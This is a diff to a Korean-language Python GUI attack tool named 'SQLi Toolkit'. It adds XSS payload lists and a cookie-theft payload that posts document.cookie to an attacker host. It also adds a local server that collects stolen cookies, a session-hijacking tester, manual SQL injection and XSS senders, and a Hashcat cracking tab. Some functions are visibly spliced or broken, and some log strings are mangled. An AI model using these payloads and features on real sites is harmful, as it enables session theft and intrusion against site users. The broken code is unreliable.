@@ -16,8 +16,8 @@ from PyQt6.QtWidgets import (
     QSizePolicy, QHeaderView, QProgressBar, QListWidget, QListWidgetItem,
     QDialog, QDialogButtonBox
 )
-from PyQt6.QtCore import Qt, QThread, pyqtSignal, QObject
-from PyQt6.QtGui import QFont, QColor, QPalette, QTextCursor, QKeySequence, QShortcut, QIcon
+from PyQt6.QtCore import Qt, QThread, pyqtSignal, QObject, pyqtSlot, QMetaObject
+from PyQt6.QtGui import QFont, QColor, QPalette, QTextCursor, QKeySequence, QShortcut
 
 try:
     import requests
@@ -25,23 +25,6 @@ try:
     HAS_REQUESTS = True
 except ImportError:
     HAS_REQUESTS = False
-
-
-def resource_path(path):
-    """Get resource path compatible with PyInstaller --onefile"""
-    if getattr(sys, 'frozen', False):
-        # Running as compiled by PyInstaller
-        base_path = sys._MEIPASS
-    else:
-        # Running from source
-        base_path = os.path.dirname(os.path.abspath(__file__))
-    
-    resource = os.path.join(base_path, path)
-    if not os.path.exists(resource):
-        # Fallback: also check in the current working directory
-        resource = os.path.join(os.getcwd(), path)
-    
-    return resource
 
 # ── 색상 ──────────────────────────────────────────────────
 BG      = "#0d1117"
@@ -73,6 +56,27 @@ XSS_PAYLOADS = [
     "<img src=x onerror=alert(1)>",
     "'><script>alert(1)</script>",
     "<svg onload=alert(1)>",
+    "<body onload=alert(1)>",
+    "javascript:alert(1)",
+    "<iframe src=javascript:alert(1)>",
+    '"><img src=x onerror=alert(1)>',
+]
+
+XSS_COOKIE_PAYLOADS = [
+    "<script>alert(document.cookie)</script>",
+    "<img src=x onerror=alert(document.cookie)>",
+    "<svg onload=alert(document.cookie)>",
+    "'><script>document.write(document.cookie)</script>",
+    "<script>var i=new Image;i.src='http://attacker/?c='+document.cookie;</script>",
+]
+
+XSS_STORED_MARKERS = [
+    "<script>alert('XSS')</script>",
+    "<img src=x onerror=alert(1)>",
+    "<svg onload=alert(1)>",
+    "alert('XSS')",
+    "onerror=alert(1)",
+    "onload=alert(1)",
 ]
 TRAVERSAL_PAYLOADS = [
     "../../../etc/passwd","..\\..\\..\\windows\\win.ini",
@@ -335,21 +339,19 @@ class SQLiToolkit(QMainWindow):
     def __init__(self):
         super().__init__()
         self.setWindowTitle("⚡ SQLi Toolkit  //  by Michael")
-        
-        # Set window icon with error handling
-        try:
-            icon_path = resource_path("icon.ico")
-            if os.path.exists(icon_path):
-                self.setWindowIcon(QIcon(icon_path))
-        except Exception as e:
-            pass  # Icon loading failed, continue without icon
-        
         self.resize(1300, 880)
 
         self._worker     = None
         self._thread     = None
         self._blind_stop = False
         self._scan_stop  = False
+        self._xss_stop   = False
+        self._cookie_server = None
+        self._stolen_data   = ("","","")
+        self._hc_process    = None
+        self._hc_hash_file  = None
+        self._hc_cracked    = []
+        self._hc_last       = None
         self._dump_cols  = []
         self._dump_rows  = []
         self.scan_results = []
@@ -428,7 +430,7 @@ class SQLiToolkit(QMainWindow):
         hl.setContentsMargins(20, 0, 20, 0)
         title = QLabel("⚡  SQLi Toolkit")
         title.setStyleSheet(f"color: {ACCENT}; font-size: 20px; font-weight: bold;")
-        sub = QLabel("sqlmap  |  Blind SQLi  |  취약점 스캐너")
+        sub = QLabel("sqlmap  |  Blind SQLi  |  XSS  |  취약점 스캐너")
         sub.setStyleSheet(f"color: {TEXT_DIM}; font-size: 11px;")
         self.status_lbl = QLabel("● IDLE")
         self.status_lbl.setStyleSheet(f"color: {TEXT_DIM}; font-size: 12px;")
@@ -445,11 +447,17 @@ class SQLiToolkit(QMainWindow):
 
         sqlmap_w = QWidget()
         scanner_w = QWidget()
-        self.main_tab.addTab(sqlmap_w, "⚡  sqlmap")
-        self.main_tab.addTab(scanner_w, "🔍  취약점 스캐너")
+        xss_w     = QWidget()
+        hashcat_w = QWidget()
+        self.main_tab.addTab(sqlmap_w,   "⚡  sqlmap")
+        self.main_tab.addTab(xss_w,      "🎯  XSS")
+        self.main_tab.addTab(scanner_w,  "🔍  취약점 스캐너")
+        self.main_tab.addTab(hashcat_w,  "💀  Hashcat")
 
         self._build_sqlmap_tab(sqlmap_w)
+        self._build_xss_tab(xss_w)
         self._build_scanner_tab(scanner_w)
+        self._build_hashcat_tab(hashcat_w)
 
     # ══════════════════════════════════════════════════════
     #  sqlmap 탭
@@ -711,9 +719,56 @@ class SQLiToolkit(QMainWindow):
         self.blind_url_entry = QLineEdit()
         self.blind_url_entry.setPlaceholderText("http://192.168.x.x/page?param=1")
         ul.addWidget(self.blind_url_entry)
+
+        self.blind_detect_btn = btn("🔎  파라미터 자동 탐지", PURPLE, "white", h=32)
+        self.blind_detect_btn.clicked.connect(self._blind_auto_detect)
+        ul.addWidget(self.blind_detect_btn)
+
+        ul.addWidget(dim_label("탐지된 파라미터"))
+        self.blind_param_combo = QComboBox()
+        self.blind_param_combo.currentIndexChanged.connect(self._blind_on_param_select)
+        ul.addWidget(self.blind_param_combo)
+        self.blind_detected_params = []
+
         lay.addWidget(url_box)
 
         lay.addWidget(dim_label("  sysobjects → syscolumns → 데이터  순서로 진행"))
+
+        # 수동 페이로드 입력
+        lay.addSpacing(4)
+        blind_manual_box = QFrame()
+        blind_manual_box.setStyleSheet(f"QFrame {{ background:{BG3}; border-radius:6px; border:1px solid {BORDER}; }}")
+        bml = QVBoxLayout(blind_manual_box)
+        bml.setContentsMargins(10,8,10,10); bml.setSpacing(4)
+        bmt = QLabel("✏️  수동 페이로드 입력")
+        bmt.setStyleSheet(f"color:{ACCENT}; font-weight:bold; font-size:12px; border:none;")
+        bml.addWidget(bmt)
+        bml.addWidget(dim_label("파라미터 선택"))
+        self.blind_manual_param = QComboBox()
+        self.blind_manual_param.setEditable(True)
+        bml.addWidget(self.blind_manual_param)
+        bml.addWidget(dim_label("페이로드 (SQL 쿼리)"))
+        self.blind_manual_payload = QLineEdit()
+        self.blind_manual_payload.setPlaceholderText("' AND 1=1--")
+        bml.addWidget(self.blind_manual_payload)
+        bml.addWidget(dim_label("HTTP 메서드"))
+        blind_method_row = QHBoxLayout()
+        self.blind_manual_method = QButtonGroup(self)
+        brb_get  = QRadioButton("GET");  brb_get.setChecked(True)
+        brb_post = QRadioButton("POST")
+        self.blind_manual_method.addButton(brb_get, 0)
+        self.blind_manual_method.addButton(brb_post, 1)
+        blind_method_row.addWidget(brb_get); blind_method_row.addWidget(brb_post)
+        blind_method_row.addStretch()
+        bml.addLayout(blind_method_row)
+        bml.addWidget(dim_label("POST 데이터 (GET이면 무시)"))
+        self.blind_manual_post = QLineEdit()
+        self.blind_manual_post.setPlaceholderText("param=PAYLOAD&other=value")
+        bml.addWidget(self.blind_manual_post)
+        b_blind_manual = btn("▶  전송 & 응답 확인", ACCENT, BG)
+        b_blind_manual.clicked.connect(self._run_blind_manual)
+        bml.addWidget(b_blind_manual)
+        lay.addWidget(blind_manual_box)
 
         # Blind 1
         b1 = self._blind_box(lay, "① 테이블명 추출", PURPLE, "sysobjects  (xtype=U)")
@@ -862,8 +917,1190 @@ class SQLiToolkit(QMainWindow):
         self.out_tab.addTab(data_w, "📊  데이터 뷰")
 
     # ══════════════════════════════════════════════════════
+    #  XSS 탭
+    # ══════════════════════════════════════════════════════
+    def _build_xss_tab(self, parent):
+        lay = QHBoxLayout(parent)
+        lay.setContentsMargins(8,8,8,8)
+        lay.setSpacing(6)
+
+        # 왼쪽 설정
+        left = QWidget(); left.setFixedWidth(340)
+        lay.addWidget(left)
+        self._build_xss_left(left)
+
+        # 오른쪽 출력
+        right = QWidget()
+        lay.addWidget(right, 1)
+        self._build_xss_right(right)
+
+    def _build_xss_left(self, parent):
+        scroll = QScrollArea()
+        scroll.setWidgetResizable(True)
+        scroll.setHorizontalScrollBarPolicy(Qt.ScrollBarPolicy.ScrollBarAlwaysOff)
+        inner = QWidget()
+        lay   = QVBoxLayout(inner)
+        lay.setContentsMargins(12,8,12,8)
+        lay.setSpacing(6)
+        scroll.setWidget(inner)
+        outer = QVBoxLayout(parent)
+        outer.setContentsMargins(0,0,0,0)
+        outer.addWidget(scroll)
+
+        # TARGET
+        lay.addWidget(section_label("[ TARGET ]", BLUE))
+        lay.addWidget(sep())
+        lay.addWidget(dim_label("대상 URL"))
+        self.xss_url_entry = QLineEdit()
+        self.xss_url_entry.setPlaceholderText("http://192.168.x.x/page?keyword=test")
+        lay.addWidget(self.xss_url_entry)
+
+        self.xss_detect_btn = btn("🔎  파라미터 자동 탐지", PURPLE, "white")
+        self.xss_detect_btn.clicked.connect(self._xss_auto_detect)
+        lay.addWidget(self.xss_detect_btn)
+
+        lay.addWidget(dim_label("탐지된 파라미터"))
+        self.xss_param_combo = QComboBox()
+        self.xss_param_combo.currentIndexChanged.connect(self._xss_on_param_select)
+        lay.addWidget(self.xss_param_combo)
+        self.xss_detected_params = []
+
+        lay.addWidget(dim_label("쿠키 (선택)"))
+        self.xss_cookie_entry = QLineEdit()
+        lay.addWidget(self.xss_cookie_entry)
+
+        # 수동 페이로드 입력
+        lay.addSpacing(6)
+        manual_box = QFrame()
+        manual_box.setStyleSheet(f"QFrame {{ background:{BG3}; border-radius:6px; border:1px solid {BORDER}; }}")
+        ml = QVBoxLayout(manual_box)
+        ml.setContentsMargins(10,8,10,10); ml.setSpacing(4)
+        mt = QLabel("✏️  수동 페이로드 입력")
+        mt.setStyleSheet(f"color:{ACCENT}; font-weight:bold; font-size:12px; border:none;")
+        ml.addWidget(mt)
+        ml.addWidget(dim_label("파라미터 선택"))
+        self.xss_manual_param = QComboBox()
+        self.xss_manual_param.setEditable(True)
+        ml.addWidget(self.xss_manual_param)
+        ml.addWidget(dim_label("페이로드"))
+        self.xss_manual_payload = QLineEdit()
+        self.xss_manual_payload.setPlaceholderText("<script>alert(1)</script>")
+        ml.addWidget(self.xss_manual_payload)
+        ml.addWidget(dim_label("HTTP 메서드"))
+        xss_method_row = QHBoxLayout()
+        self.xss_manual_method = QButtonGroup(self)
+        rb_get  = QRadioButton("GET");  rb_get.setChecked(True)
+        rb_post = QRadioButton("POST")
+        self.xss_manual_method.addButton(rb_get, 0)
+        self.xss_manual_method.addButton(rb_post, 1)
+        xss_method_row.addWidget(rb_get); xss_method_row.addWidget(rb_post)
+        xss_method_row.addStretch()
+        ml.addLayout(xss_method_row)
+        b_manual = btn("▶  전송 & 응답 확인", ACCENT, BG)
+        b_manual.clicked.connect(self._run_xss_manual)
+        ml.addWidget(b_manual)
+        lay.addWidget(manual_box)
+
+        # 반사형 XSS
+        lay.addSpacing(6)
+        ref_box = QFrame()
+        ref_box.setStyleSheet(f"QFrame {{ background:{BG3}; border-radius:6px; border:1px solid {BORDER}; }}")
+        rl = QVBoxLayout(ref_box)
+        rl.setContentsMargins(10,8,10,10); rl.setSpacing(4)
+        rl.addWidget(QLabel("🔴  반사형 XSS (Reflected)") )
+        rl.addWidget(dim_label("입력값이 즉시 응답에 반사되는지 확인"))
+        ref_box.layout().itemAt(0).widget().setStyleSheet(f"color:{RED}; font-weight:bold; font-size:12px; border:none;")
+
+        self.xss_reflected_cb = QCheckBox("기본 페이로드")
+        self.xss_reflected_cb.setChecked(True)
+        rl.addWidget(self.xss_reflected_cb)
+        self.xss_cookie_cb = QCheckBox("쿠키 탈취 페이로드")
+        self.xss_cookie_cb.setChecked(True)
+        rl.addWidget(self.xss_cookie_cb)
+
+        b_ref = btn("▶  반사형 XSS 탐지", RED, "white")
+        b_ref.clicked.connect(self._run_reflected_xss)
+        rl.addWidget(b_ref)
+        lay.addWidget(ref_box)
+
+        # 저장형 XSS
+        stor_box = QFrame()
+        stor_box.setStyleSheet(f"QFrame {{ background:{BG3}; border-radius:6px; border:1px solid {BORDER}; }}")
+        sl = QVBoxLayout(stor_box)
+        sl.setContentsMargins(10,8,10,10); sl.setSpacing(4)
+        title2 = QLabel("🟡  저장형 XSS (Stored)")
+        title2.setStyleSheet(f"color:{YELLOW}; font-weight:bold; font-size:12px; border:none;")
+        sl.addWidget(title2)
+        sl.addWidget(dim_label("삽입 URL과 확인 URL이 다름 (게시판, 댓글 등)"))
+
+        # 삽입 URL
+        sl.addWidget(dim_label("삽입 URL (POST)"))
+        store_url_row = QHBoxLayout()
+        self.xss_store_url = QLineEdit()
+        self.xss_store_url.setPlaceholderText("http://x.x.x.x/board/write.php")
+        store_url_row.addWidget(self.xss_store_url)
+        store_detect_btn = QPushButton("🔎")
+        store_detect_btn.setFixedSize(32, 32)
+        store_detect_btn.setToolTip("삽입 URL 파라미터 탐지")
+        store_detect_btn.setStyleSheet(f"background:{PURPLE}; color:white; border:none; border-radius:4px; font-size:14px;")
+        store_detect_btn.clicked.connect(self._xss_store_detect)
+        store_url_row.addWidget(store_detect_btn)
+        sl.addLayout(store_url_row)
+
+        sl.addWidget(dim_label("탐지된 파라미터 → POST 데이터 자동 완성"))
+        self.xss_store_param_combo = QComboBox()
+        self.xss_store_param_combo.currentIndexChanged.connect(self._xss_store_param_select)
+        sl.addWidget(self.xss_store_param_combo)
+        self.xss_store_detected = []
+
+        sl.addWidget(dim_label("POST 데이터 (페이로드 위치에 XSS_PAYLOAD 입력)"))
+        self.xss_store_data = QLineEdit()
+        self.xss_store_data.setPlaceholderText("title=XSS_PAYLOAD&content=test")
+        sl.addWidget(self.xss_store_data)
+
+        # 확인 URL
+        sl.addWidget(dim_label("확인 URL (삽입 후 조회할 페이지)"))
+        check_url_row = QHBoxLayout()
+        self.xss_check_url = QLineEdit()
+        self.xss_check_url.setPlaceholderText("http://x.x.x.x/board/list.php")
+        check_url_row.addWidget(self.xss_check_url)
+        check_detect_btn = QPushButton("🔎")
+        check_detect_btn.setFixedSize(32, 32)
+        check_detect_btn.setToolTip("확인 URL 파라미터 탐지")
+        check_detect_btn.setStyleSheet(f"background:{BLUE}; color:white; border:none; border-radius:4px; font-size:14px;")
+        check_detect_btn.clicked.connect(self._xss_check_detect)
+        check_url_row.addWidget(check_detect_btn)
+        sl.addLayout(check_url_row)
+        sl.addWidget(dim_label("← 확인 URL은 GET 파라미터도 탐지"))
+
+        b_stor = btn("▶  저장형 XSS 탐지", YELLOW, BG)
+        b_stor.clicked.connect(self._run_stored_xss)
+        sl.addWidget(b_stor)
+        lay.addWidget(stor_box)
+
+        # 페이로드 모음
+        pay_box = QFrame()
+        pay_box.setStyleSheet(f"QFrame {{ background:{BG3}; border-radius:6px; border:1px solid {BORDER}; }}")
+        pl2 = QVBoxLayout(pay_box)
+        pl2.setContentsMargins(10,8,10,10); pl2.setSpacing(4)
+        title3 = QLabel("📋  XSS 페이로드 모음")
+        title3.setStyleSheet(f"color:{PURPLE}; font-weight:bold; font-size:12px; border:none;")
+        pl2.addWidget(title3)
+        pl2.addWidget(dim_label("클릭하면 클립보드에 복사"))
+
+        payloads = [
+            ("기본 팝업",       "<script>alert('XSS')</script>"),
+            ("img 태그",        "<img src=x onerror=alert(1)>"),
+            ("svg 태그",        "<svg onload=alert(1)>"),
+            ("쿠키 출력",       "<script>alert(document.cookie)</script>"),
+            ("쿠키 img",        "<img src=x onerror=alert(document.cookie)>"),
+            ("우회 (대소문자)", "<ScRiPt>alert(1)</ScRiPt>"),
+            ("우회 (인코딩)",   "&#60;script&#62;alert(1)&#60;/script&#62;"),
+            ("href js",         "<a href=javascript:alert(1)>클릭</a>"),
+        ]
+        for name, payload in payloads:
+            row = QHBoxLayout()
+            lbl2 = QLabel(name)
+            lbl2.setStyleSheet(f"color:{TEXT_DIM}; font-size:10px; border:none;")
+            lbl2.setFixedWidth(90)
+            row.addWidget(lbl2)
+            pb = QPushButton(payload[:40] + ("..." if len(payload) > 40 else ""))
+            pb.setStyleSheet(f"""
+                QPushButton {{
+                    background:{BG2}; color:{ACCENT}; border:none;
+                    border-radius:3px; padding:3px 6px;
+                    font-size:10px; text-align:left;
+                }}
+                QPushButton:hover {{ background:{BG}; }}
+            """)
+            pb.setFixedHeight(26)
+            pb.clicked.connect(lambda _, p=payload: (
+                QApplication.clipboard().setText(p),
+                self.xss_log.append(f'<span style="color:{ACCENT}">클립보드 복사: {p}</span>')
+            ))
+            row.addWidget(pb, 1)
+            pl2.addLayout(row)
+        lay.addWidget(pay_box)
+
+        lay.addSpacing(6)
+        lay.addWidget(sep())
+        xss_stop = btn("■  중지", RED, "white")
+        xss_stop.clicked.connect(self._stop_xss)
+        lay.addWidget(xss_stop)
+        lay.addStretch()
+
+    def _build_xss_right(self, parent):
+        lay = QVBoxLayout(parent)
+        lay.setContentsMargins(0,0,0,0)
+
+        self.xss_out_tab = QTabWidget()
+        lay.addWidget(self.xss_out_tab)
+
+        # 로그
+        log_w = QWidget()
+        ll = QVBoxLayout(log_w); ll.setContentsMargins(4,4,4,4)
+        self.xss_log = QTextEdit()
+        self.xss_log.setReadOnly(True)
+        self.xss_log.setFont(QFont("Courier New", 11))
+        ll.addWidget(self.xss_log)
+        self.xss_out_tab.addTab(log_w, "📋  탐지 로그")
+
+        # 결과
+        res_w = QWidget()
+        rl2 = QVBoxLayout(res_w); rl2.setContentsMargins(4,4,4,4)
+        self.xss_result_tree = QTreeWidget()
+        self.xss_result_tree.setAlternatingRowColors(True)
+        self.xss_result_tree.setRootIsDecorated(False)
+        self.xss_result_tree.setHeaderLabels(["유형","URL","파라미터","페이로드","비고"])
+        self.xss_result_tree.header().setSectionResizeMode(QHeaderView.ResizeMode.ResizeToContents)
+        rl2.addWidget(self.xss_result_tree)
+        self.xss_out_tab.addTab(res_w, "🚨  발견된 XSS")
+
+        # 쿠키 수신 탭
+        cookie_w = QWidget()
+        cl = QVBoxLayout(cookie_w); cl.setContentsMargins(4,4,4,4); cl.setSpacing(6)
+
+        # 수신 서버 컨트롤
+        srv_box = QFrame()
+        srv_box.setStyleSheet(f"QFrame {{ background:{BG3}; border-radius:6px; border:1px solid {BORDER}; }}")
+        sl2 = QVBoxLayout(srv_box); sl2.setContentsMargins(10,8,10,10); sl2.setSpacing(4)
+        srv_title = QLabel("🎣  쿠키 수신 서버")
+        srv_title.setStyleSheet(f"color:{RED}; font-weight:bold; font-size:12px; border:none;")
+        sl2.addWidget(srv_title)
+        sl2.addWidget(dim_label("XSS 페이로드로 탈취된 쿠키를 수신 대기"))
+
+        port_row = QHBoxLayout()
+        port_row.addWidget(dim_label("포트"))
+        self.cookie_srv_port = QLineEdit("8877")
+        self.cookie_srv_port.setFixedWidth(70)
+        port_row.addWidget(self.cookie_srv_port)
+        port_row.addSpacing(10)
+        self.cookie_srv_status = QLabel("● 중지됨")
+        self.cookie_srv_status.setStyleSheet(f"color:{TEXT_DIM}; border:none;")
+        port_row.addWidget(self.cookie_srv_status)
+        port_row.addStretch()
+        sl2.addLayout(port_row)
+
+        # 수신용 페이로드 자동 생성
+        sl2.addWidget(dim_label("수신용 페이로드 (복사해서 삽입)"))
+        self.cookie_payload_view = QLineEdit()
+        self.cookie_payload_view.setReadOnly(True)
+        self.cookie_payload_view.setStyleSheet(f"background:{BG}; color:{ACCENT}; border:1px solid {BORDER}; border-radius:4px; padding:4px;")
+        self.cookie_payload_view.setText('<script>fetch("http://127.0.0.1:8877/?c="+document.cookie)</script>')
+        sl2.addWidget(self.cookie_payload_view)
+
+        btn_row = QHBoxLayout()
+        self.srv_start_btn = btn("▶  서버 시작", ACCENT, BG, h=32)
+        self.srv_stop_btn  = btn("■  서버 중지", RED, "white", h=32)
+        self.srv_stop_btn.setEnabled(False)
+        copy_payload_btn   = btn("📋  페이로드 복사", BG3, TEXT_DIM, h=32)
+        self.srv_start_btn.clicked.connect(self._start_cookie_server)
+        self.srv_stop_btn.clicked.connect(self._stop_cookie_server)
+        copy_payload_btn.clicked.connect(lambda: QApplication.clipboard().setText(
+            self.cookie_payload_view.text()))
+        btn_row.addWidget(self.srv_start_btn)
+        btn_row.addWidget(self.srv_stop_btn)
+        btn_row.addWidget(copy_payload_btn)
+        sl2.addLayout(btn_row)
+        cl.addWidget(srv_box)
+
+        # 포트 변경시 페이로드 자동 업데이트
+        self.cookie_srv_port.textChanged.connect(lambda p: self.cookie_payload_view.setText(
+            f'<script>fetch("http://127.0.0.1:{p}/?c="+document.cookie)</script>'))
+
+        # 수신된 쿠키 목록
+        cl.addWidget(section_label("탈취된 쿠키 목록", RED))
+        self.stolen_cookie_tree = QTreeWidget()
+        self.stolen_cookie_tree.setAlternatingRowColors(True)
+        self.stolen_cookie_tree.setRootIsDecorated(False)
+        self.stolen_cookie_tree.setHeaderLabels(["시간","IP","쿠키값"])
+        self.stolen_cookie_tree.header().setSectionResizeMode(QHeaderView.ResizeMode.ResizeToContents)
+        self.stolen_cookie_tree.itemDoubleClicked.connect(self._use_stolen_cookie)
+        cl.addWidget(self.stolen_cookie_tree)
+        cl.addWidget(dim_label("더블클릭 → 해당 쿠키를 sqlmap/스캐너에 자동 입력"))
+
+        # 세션 재사용
+        sess_box = QFrame()
+        sess_box.setStyleSheet(f"QFrame {{ background:{BG3}; border-radius:6px; border:1px solid {BORDER}; }}")
+        ssbl = QVBoxLayout(sess_box); ssbl.setContentsMargins(10,8,10,10); ssbl.setSpacing(4)
+        sess_title = QLabel("🔑  세션 하이재킹")
+        sess_title.setStyleSheet(f"color:{YELLOW}; font-weight:bold; font-size:12px; border:none;")
+        ssbl.addWidget(sess_title)
+        ssbl.addWidget(dim_label("탈취한 쿠키로 인증 우회 테스트"))
+        ssbl.addWidget(dim_label("대상 URL"))
+        self.hijack_url = QLineEdit()
+        self.hijack_url.setPlaceholderText("http://192.168.x.x/mypage")
+        ssbl.addWidget(self.hijack_url)
+        ssbl.addWidget(dim_label("쿠키값 (목록에서 더블클릭하면 자동 입력)"))
+        self.hijack_cookie = QLineEdit()
+        self.hijack_cookie.setPlaceholderText("PHPSESSID=abcdef1234...")
+        ssbl.addWidget(self.hijack_cookie)
+        b_hijack = btn("▶  세션 하이재킹 테스트", YELLOW, BG, h=34)
+        b_hijack.clicked.connect(self._run_hijack)
+        ssbl.addWidget(b_hijack)
+        cl.addWidget(sess_box)
+
+        self.xss_out_tab.addTab(cookie_w, "🍪  쿠키 탈취/하이재킹")
+        self._cookie_server = None
+
+    # ── XSS 탐지 로직 ────────────────────────────────────
+    def _xss_log(self, text, color=None):
+        c = color or TEXT
+        cursor = self.xss_log.textCursor()
+        cursor.movePosition(QTextCursor.MoveOperation.End)
+        fmt = cursor.charFormat()
+        fmt.setForeground(QColor(c))
+        cursor.setCharFormat(fmt)
+        cursor.insertText(text)
+        self.xss_log.setTextCursor(cursor)
+        self.xss_log.ensureCursorVisible()
+
+    def _xss_store_detect(self):
+        """삽입 URL 파라미터 탐지"""
+        url = self.xss_store_url.text().strip()
+        if not url: QMessageBox.critical(self,"오류","삽입 URL 입력해줘"); return
+        if not url.startswith("http"): url = "http://"+url
+        self._detect_params(url, self._xss_store_detect_done)
+
+    def _xss_store_detect_done(self, found):
+        if not found:
+            QMessageBox.information(self,"결과","파라미터를 찾지 못했어"); return
+        self.xss_store_detected = found
+        self.xss_store_param_combo.clear()
+        for label, full in found:
+            self.xss_store_param_combo.addItem(label, full)
+        self._xss_store_param_select(0)
+        self._xss_log(f"\u2713 삽입 URL 파라미터 {len(found)}개 탐지됨\n", ACCENT)
+    def _xss_store_param_select(self, idx):
+        """파라미터 선택시 POST 데이터 자동 완성"""
+        if idx < 0 or idx >= len(self.xss_store_detected): return
+        label, full = self.xss_store_detected[idx]
+        if "||POST||" in full:
+            # POST 파라미터 → POST 데이터 자동 완성
+            parts   = full.split("||POST||")
+            action  = parts[0]
+            param   = parts[1].split("=")[0]
+            self.xss_store_url.setText(action)
+            self.xss_store_data.setText(f"{param}=XSS_PAYLOAD")
+        else:
+            # GET 파라미터
+            parsed = urllib.parse.urlparse(full)
+            qs     = urllib.parse.parse_qs(parsed.query)
+            params = list(qs.keys())
+            if params:
+                param = params[0]
+                self.xss_store_url.setText(full)
+                self.xss_store_data.setText(f"{param}=XSS_PAYLOAD")
+
+    def _xss_check_detect(self):
+        """확인 URL 파라미터 탐지"""
+        url = self.xss_check_url.text().strip()
+        if not url: QMessageBox.critical(self,"오류","확인 URL 입력해줘"); return
+        if not url.startswith("http"): url = "http://"+url
+        self._detect_params(url, self._xss_check_detect_done)
+
+    def _xss_check_detect_done(self, found):
+        if not found:
+            QMessageBox.information(self,"결과","파라미터를 찾지 못했어\n확인 URL은 파라미터 없어도 됨"); return
+        # 확인 URL은 파라미터 없어도 되니까 그냥 정보만 출력
+        self._xss_log(f"\u2713 확인 URL 파라미터 {len(found)}개 발견\n", BLUE)
+        for label, _ in found:
+            self._xss_log(f"  {label}\n", TEXT_DIM)
+        if not url: QMessageBox.critical(self,"오류","URL 입력해줘"); return
+        self._detect_params(url, self._xss_detect_done, self.xss_detect_btn)
+
+    def _xss_detect_done(self, found):
+        if not found:
+            QMessageBox.information(self,"결과","파라미터를 찾지 못했어"); return
+        self.xss_detected_params = found
+        self.xss_param_combo.clear()
+        self.xss_manual_param.clear()
+        for label, full in found:
+            self.xss_param_combo.addItem(label)
+            # 파라미터 이름만 추출해서 수동 콤보에 추가
+            param_name = label.split("?")[-1].split("=")[0].strip().lstrip("[GET FORM] ").lstrip("[POST FORM] ").lstrip("[LINK] ").split("?")[-1]
+            self.xss_manual_param.addItem(param_name, full)
+        self._xss_on_param_select(0)
+        self._xss_log(f"\u2713 파라미터 {len(found)}개 탐지됨\n", ACCENT)
+
+    def _xss_on_param_select(self, idx):
+        if idx < 0 or idx >= len(self.xss_detected_params): return
+        label, full = self.xss_detected_params[idx]
+        if "||POST||" not in full:
+            self.xss_url_entry.setText(full)
+
+    def _blind_auto_detect(self):
+        url = self.blind_url_entry.text().strip()
+        if not url: QMessageBox.critical(self,"오류","URL 입력해줘"); return
+        self._detect_params(url, self._blind_detect_done, self.blind_detect_btn)
+
+    def _blind_detect_done(self, found):
+        if not found:
+            QMessageBox.information(self,"결과","파라미터를 찾지 못했어"); return
+        self.blind_detected_params = found
+        self.blind_param_combo.clear()
+        self.blind_manual_param.clear()
+        for label, full in found:
+            self.blind_param_combo.addItem(label)
+            param_name = label.split("?")[-1].split("=")[0].strip()
+            self.blind_manual_param.addItem(param_name, full)
+        self._blind_on_param_select(0)
+
+    def _blind_on_param_select(self, idx):
+        if idx < 0 or idx >= len(self.blind_detected_params): return
+        label, full = self.blind_detected_params[idx]
+        if "||POST||" not in full:
+            self.blind_url_entry.setText(full)
+
+    def _run_xss_manual(self):
+        """XSS 수동 페이로드 전송"""
+        url     = self.xss_url_entry.text().strip()
+        payload = self.xss_manual_payload.text().strip()
+        param   = self.xss_manual_param.currentText().strip()
+        if not url or not payload or not param:
+            QMessageBox.critical(self,"오류","URL / 파라미터 / 페이로드 입력해줘"); return
+        if not url.startswith("http"): url = "http://"+url
+        cookie  = self.xss_cookie_entry.text().strip()
+        method  = self.xss_manual_method.checkedId()
+        threading.Thread(
+            target=self._manual_send,
+            args=(url, param, payload, method, cookie, "xss"),
+            daemon=True).start()
+
+    def _run_blind_manual(self):
+        """Blind SQLi 수동 페이로드 전송"""
+        url      = self.blind_url_entry.text().strip()
+        payload  = self.blind_manual_payload.text().strip()
+        param    = self.blind_manual_param.currentText().strip()
+        method   = self.blind_manual_method.checkedId()
+        post_tmpl= self.blind_manual_post.text().strip()
+        if not url or not payload or not param:
+            QMessageBox.critical(self,"오류","URL / 파라미터 / 페이로드 입력해줘"); return
+        if not url.startswith("http"): url = "http://"+url
+        threading.Thread(
+            target=self._manual_send,
+            args=(url, param, payload, method, "", "blind", post_tmpl),
+            daemon=True).start()
+
+    def _manual_send(self, url, param, payload, method, cookie,
+                     mode, post_tmpl=""):
+        """공통 수동 전송 로직"""
+        import time
+        session = requests.Session()
+        session.headers["User-Agent"] = "Mozilla/5.0"
+        if cookie: session.headers["Cookie"] = cookie
+
+        log = self._xss_log if mode == "xss" else (
+              lambda t, c=None: self._log(t, "info"))
+
+        log(f"\n" + "-"*44 + "\n", BORDER)
+        log("  \xec\x88\x98\xeb\x8f\x99 \xec\xa0\x84\xec\x86\xa1\n", BLUE)
+        log(f"  \xed\x8c\x8c\xeb\x9d\xbc\xeb\xaf\xb8\ud130 : {param}\n", TEXT_DIM)
+        log(f"  \xed\x8e\x98\xec\x9d\xb4\xeb\xa1\x9c\xeb\x93\x9c : {payload}\n", YELLOW)
+        log(f"  \uba54\uc11c\ub4dc   : {'GET' if method==0 else 'POST'}\n", TEXT_DIM)
+        log("-"*44 + "\n\n", BORDER)
+        try:
+            t0 = time.time()
+            if method == 0:
+                # GET
+                parsed = urllib.parse.urlparse(url)
+                qs = urllib.parse.parse_qs(parsed.query)
+                qs[param] = [payload]
+                req_url = parsed._replace(
+                    query=urllib.parse.urlencode(qs, doseq=True)).geturl()
+                log(f"  GET {req_url}\n", TEXT_DIM)
+                r = session.get(req_url, timeout=10, verify=False)
+            else:
+                # POST
+                if post_tmpl:
+                    post_data = dict(urllib.parse.parse_qsl(
+                        post_tmpl.replace("PAYLOAD", payload)))
+                else:
+                    log(f"  POST {url}  data: {post_data}\n", TEXT_DIM)
+                r = session.post(url, data=post_data, timeout=10, verify=False)
+
+            elapsed = time.time() - t0
+            log(f"\n  응답 코드  : {r.status_code}\n", ACCENT)
+            log(f"  응답 길이  : {len(r.text)} bytes\n", ACCENT)
+            log(f"  응답 시간  : {elapsed:.2f}초\n", ACCENT)
+
+            # 페이로드 반사 확인
+            if payload in r.text:
+                log(f"\n  [반사 감지!] 페이로드가 응답에 포함됨\n", RED)
+            else:
+                log("\n  [-] 페이로드 반사 없음\n", TEXT_DIM)
+
+            # 응답 미리보기 (500자)
+            preview = r.text[:500].replace("\n", " ").replace("\r", "")
+            log(f"\n  응답 미리보기:\n  {preview}\n", TEXT_DIM)
+
+            # SQLi 에러 확인 (Blind 모드)
+            if mode == "blind":
+                body = r.text.lower()
+                for err in SQLI_ERRORS:
+                    if err in body:
